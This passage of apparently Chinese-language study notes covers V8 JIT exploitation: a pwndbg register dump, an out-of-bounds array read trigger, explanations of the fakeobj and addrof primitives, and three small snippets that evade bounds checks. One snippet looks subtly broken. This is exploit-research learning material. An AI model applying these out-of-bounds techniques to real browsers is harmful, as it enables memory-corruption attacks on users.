  v16_int8 = `{`0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0`}`, 
  v8_int16 = `{`0x0, 0x0, 0x0, 0x4008, 0x0, 0x0, 0x0, 0x0`}`, 
  v4_int32 = `{`0x0, 0x40080000, 0x0, 0x0`}`, 
  v2_int64 = `{`0x4008000000000000, 0x0`}`, 
  uint128 = 0x00000000000000004008000000000000
`}`
pwndbg&gt; i registers xmm0
xmm0           `{`
 shibaishibai v4_float = `{`0x0, 0x1b, 0x0, 0x0`}`, 
  v2_double = `{`0x7fffffff, 0x0`}`, 
  v16_int8 = `{`0x0, 0x0, 0xc0, 0xff, 0xff, 0xff, 0xdf, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0`}`, 
  v8_int16 = `{`0x0, 0xffc0, 0xffff, 0x41df, 0x0, 0x0, 0x0, 0x0`}`, 
  v4_int32 = `{`0xffc00000, 0x41dfffff, 0x0, 0x0`}`, 
  v2_int64 = `{`0x41dfffffffc00000, 0x0`}`, 
  uint128 = 0x000000000000000041dfffffffc00000
```

```
在触发漏洞的时候如果加上debugprint往往触发失败

function foo(argg)
`{`
    let oob = [1.0,1.1,1.2];
    let m = `{`o:3`}`;
    // if(argg == 1)
    // `{`
        // %DebugPrint(oob);
    // `}`

    return oob[m.o];
`}`
可能由于代码变了　这次存在一个参数为１　的判断
```

Fakeobj　其实就是存在一个obj的数组，将数组中的元素设置为你想伪造的类型的map值，

之后返回伪造的对象，虽然说伪造的对象与float值实现相等的，但是却是不同的意义

addrof　应用了数组的索引功能

任意地址读写应用的是数组的索引功能，伪造一个数组

根据一个特殊的array进行构造

几种跳过loadElement的方法

```
function opt()`{`
    let arr = [0, 1, 2, 3];
    let idx = 4;
     idx &amp;= 0xfff;
    return arr[idx];
`}`

for(var i=0; i &lt; 0x10000; i++)
    opt()

var x = opt()
console.log(x)
算数运算
```

```
function opt()`{`
    let arr = [0, 1, 2, 3];
    let o = `{`x: 4`}`;
     return arr[o.x];
`}`

for(var i=0; i &lt; 0x10000; i++)
    opt()

var x = opt()
console.log(x)
```

```
function opt(x)`{`
    let arr = [0, 1, 2, 3];
    let idx = (x="foo")?4:2;
    return a[idx];
`}`

for(var i=0; i &lt; 0x10000; i++)
    opt()

var x = opt("foo")
console.log(x)
无效的phi节点
```
